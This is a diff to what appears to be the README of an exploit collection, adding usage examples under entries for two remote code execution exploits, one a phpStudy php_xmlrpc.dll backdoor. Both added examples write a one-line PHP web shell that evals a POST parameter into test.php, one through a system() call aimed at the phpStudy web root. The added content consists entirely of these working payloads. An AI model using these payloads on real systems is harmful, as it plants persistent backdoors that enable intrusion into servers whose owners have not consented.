@@ -62,9 +62,23 @@ Reference:
 
 https://seclists.org/fulldisclosure/2019/Sep/31
 
+Eg.
+
+```
+echo \<?php @eval\(\$_POST[pwd]\)\;?\> >test.php
+```
+
 ### phpStudy_5.2-5.45_(php_xmlrpc.dll)_backdoor_RCE.py
 
 Reference:
 
 https://mp.weixin.qq.com/s/dTzWfYGdkNqEl0vd72oC2w
+
+Eg.
+
+```
+system('cmd /c "echo ^<?php @eval(^$_POST[pwd]);?^> >D:\phpstudy\WWW\test.php"');
+```
+
+
 
